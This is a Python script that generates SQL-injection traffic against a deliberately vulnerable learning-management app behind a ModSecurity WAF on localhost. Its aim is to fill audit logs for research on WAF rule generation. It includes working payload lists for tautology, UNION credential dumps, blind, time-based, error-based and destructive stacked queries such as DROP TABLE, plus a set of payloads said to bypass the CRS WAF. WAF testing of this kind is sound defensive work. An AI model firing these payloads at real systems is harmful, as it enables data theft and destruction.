#!/usr/bin/env python3
"""
attackScript.py
===============
Generate SQL-injection attack traffic against the vulnerable LMS target
*through the XAF WAF*, so that ModSecurity writes real entries into
modsec-logs/audit.log. Those entries are the input for the parsing /
clustering / rule-generation pipeline.

Lab use only. By default this targets your own WAF on http://localhost:8080.
Sending traffic to :5000 would hit the LMS directly and bypass the WAF
(nothing would be logged by ModSecurity), so keep the target on the proxy port.

LMS SQLi sinks:
  POST /login       — form fields: username, password
  GET  /courses?q=  — query param: q  (WAF inspects even without a session)

Requires only the Python 3 standard library.

Usage
-----
    python3 attackScript.py
    python3 attackScript.py --url http://localhost:8080 --rounds 5 --delay 0.3
    python3 attackScript.py --no-benign        # attacks only
    python3 attackScript.py --rounds 10 --delay 0.1   # more volume, faster
    python3 attackScript.py --bypasses-only    # only payloads that evade the traditional WAF

After it runs, check the log:
    tail -n 20 ~/Desktop/XAF/modsec-logs/audit.log
    wc -l ~/Desktop/XAF/modsec-logs/audit.log
"""

import argparse
import random
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from collections import Counter

# ---------------------------------------------------------------------------
# Payload sets, grouped by family.
# ---------------------------------------------------------------------------
SQLI_PAYLOADS = {
    "tautology": [
        "' OR 1=1-- -",
        "' OR '1'='1",
        "admin'-- -",
        "') OR ('1'='1",
        "' OR 1=1#",
        '" OR ""="',
        "or 1=1",
    ],
    "union": [
        "' UNION SELECT NULL-- -",
        "' UNION SELECT username, password FROM users-- -",
        "1' UNION SELECT 1,2,3-- -",
        "' UNION ALL SELECT NULL,NULL,NULL-- -",
        "' UNION SELECT code,title,instructor FROM courses-- -",
    ],
    "boolean_blind": [
        "' AND 1=1-- -",
        "' AND 1=2-- -",
        "1' AND '1'='1",
        "1' AND '1'='2",
    ],
    "time_based": [
        "' OR SLEEP(5)-- -",
        "'; WAITFOR DELAY '0:0:5'-- -",
        "' OR pg_sleep(5)-- -",
        "1' AND SLEEP(5)-- -",
    ],
    "error_based": [
        "' AND extractvalue(1, concat(0x7e, version()))-- -",
        "' AND updatexml(1, concat(0x7e, (SELECT version())), 1)-- -",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    ],
    "stacked": [
        "'; DROP TABLE users-- -",
        "1; SELECT * FROM users",
        "'; UPDATE users SET password='x'-- -",
    ],
    "obfuscated": [
        "'/**/OR/**/1=1-- -",
        "' oR 1=1-- -",
        "'||'1'='1",
        "')/**/UNION/**/SELECT/**/NULL-- -",
        "'    OR     1   =   1-- -",
        "'%09OR%091=1-- -",
    ],
}

# Payloads confirmed to bypass the traditional CRS-based WAF (code=200 in testing).
# These are the ones the adaptive WAF must catch.
BYPASS_PAYLOADS = {
    "tautology": [
        "or 1=1",
        "admin'-- -",
    ],
    "stacked": [
        "1; SELECT * FROM users",
    ],
}

# Benign baseline — these should mostly NOT be blocked (false-positive check).
BENIGN_PAYLOADS = [
    "python",
    "data science",
    "networking",
    "mathematics",
    "student1",
    "web development",
    "1",
]


def do_request(url, data=None, headers=None, timeout=10):
    """Send one request and return the HTTP status code (or an ERR string)."""
    method = "POST" if data is not None else "GET"
    req = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
    req.add_header("User-Agent", "xaf-attack-sim/1.0")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status
    except urllib.error.HTTPError as e:
        return e.code
    except urllib.error.URLError as e:
        return f"ERR:{e.reason}"


def attack_login_username(base, payload):
    """POST /login — inject into the username field."""
    body = urllib.parse.urlencode({"username": payload, "password": "wrongpass"}).encode()
    return do_request(
        f"{base}/login",
        data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )


def attack_login_password(base, payload):
    """POST /login — inject into the password field."""
    body = urllib.parse.urlencode({"username": "admin", "password": payload}).encode()
    return do_request(
        f"{base}/login",
        data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )


def attack_courses_search(base, payload):
    """GET /courses?q= — inject into the course search parameter."""
    qs = urllib.parse.urlencode({"q": payload})
    return do_request(f"{base}/courses?{qs}")


def attack_benign_login(base, payload):
    """POST /login with a benign username (false-positive baseline)."""
    body = urllib.parse.urlencode({"username": payload, "password": "wrongpass"}).encode()
    return do_request(
        f"{base}/login",
        data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )


def build_tasks(include_benign):
    """Return a list of (family, vector, payload, callable) tasks."""
    tasks = []
    for family, payloads in SQLI_PAYLOADS.items():
        for p in payloads:
            tasks.append((family, "login_username", p,
                          lambda base, p=p: attack_login_username(base, p)))
            tasks.append((family, "login_password", p,
                          lambda base, p=p: attack_login_password(base, p)))
            tasks.append((family, "courses_q", p,
                          lambda base, p=p: attack_courses_search(base, p)))
    if include_benign:
        for p in BENIGN_PAYLOADS:
            tasks.append(("benign", "login_username", p,
                          lambda base, p=p: attack_benign_login(base, p)))
            tasks.append(("benign", "courses_q", p,
                          lambda base, p=p: attack_courses_search(base, p)))
    return tasks


def build_bypass_tasks():
    """Return tasks for only the payloads that evade the traditional CRS WAF."""
    tasks = []
    for family, payloads in BYPASS_PAYLOADS.items():
        for p in payloads:
            tasks.append((family, "login_username", p,
                          lambda base, p=p: attack_login_username(base, p)))
            tasks.append((family, "login_password", p,
                          lambda base, p=p: attack_login_password(base, p)))
            tasks.append((family, "courses_q", p,
                          lambda base, p=p: attack_courses_search(base, p)))
    return tasks


def main():
    ap = argparse.ArgumentParser(description="SQLi attack-traffic generator for the XAF WAF lab.")
    ap.add_argument("--url", default="http://localhost:8080",
                    help="Base URL of the WAF proxy (default: http://localhost:8080)")
    ap.add_argument("--rounds", type=int, default=3,
                    help="How many times to cycle through the full payload set (default: 3)")
    ap.add_argument("--delay", type=float, default=0.25,
                    help="Seconds to wait between requests (default: 0.25)")
    ap.add_argument("--no-benign", action="store_true",
                    help="Send attack payloads only, skip benign baseline traffic")
    ap.add_argument("--bypasses-only", action="store_true",
                    help="Send only payloads that evade the traditional CRS WAF (adaptive WAF demo)")
    args = ap.parse_args()

    base = args.url.rstrip("/")
    if ":5000" in base:
        print("WARNING: :5000 hits the LMS directly and bypasses the WAF — "
              "nothing will be logged by ModSecurity. Use the proxy port (8080).\n")

    if args.bypasses_only:
        tasks = build_bypass_tasks()
        print("Mode            : bypasses-only (payloads that evade the traditional CRS WAF)")
    else:
        tasks = build_tasks(include_benign=not args.no_benign)
    total = len(tasks) * args.rounds
    print(f"Target          : {base}")
    print(f"Payload tasks   : {len(tasks)} per round")
    print(f"Rounds          : {args.rounds}")
    print(f"Total requests  : {total}")
    print(f"Delay / request : {args.delay}s\n")

    status_counts = Counter()
    family_blocked = Counter()
    family_total = Counter()
    sent = 0

    try:
        for r in range(1, args.rounds + 1):
            random.shuffle(tasks)
            for family, vector, payload, fn in tasks:
                code = fn(base)
                status_counts[code] += 1
                family_total[family] += 1
                if code == 403:
                    family_blocked[family] += 1
                sent += 1

                blocked = "BLOCKED" if code == 403 else f"code={code}"
                short = (payload[:42] + "…") if len(payload) > 43 else payload
                print(f"[r{r}] {family:<13} {vector:<16} {blocked:<10} {short}")
                time.sleep(args.delay)
    except KeyboardInterrupt:
        print("\nInterrupted — printing partial summary.\n")

    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    print(f"Requests sent : {sent}")
    print("\nBy status code:")
    for code, n in sorted(status_counts.items(), key=lambda kv: str(kv[0])):
        print(f"  {str(code):<10} {n}")

    print("\nBlock rate by family (403 / total):")
    if args.bypasses_only:
        families = list(BYPASS_PAYLOADS.keys())
    else:
        families = list(SQLI_PAYLOADS.keys()) + (["benign"] if not args.no_benign else [])
    for family in families:
        t = family_total.get(family, 0)
        b = family_blocked.get(family, 0)
        if t:
            pct = (b / t) * 100
            print(f"  {family:<13} {b:>4}/{t:<4} ({pct:5.1f}%)")

    print("\nNow inspect the audit log the WAF just wrote:")
    print("  tail -n 20 ~/Desktop/XAF/modsec-logs/audit.log")
    print("  wc -l   ~/Desktop/XAF/modsec-logs/audit.log")


if __name__ == "__main__":
    sys.exit(main())
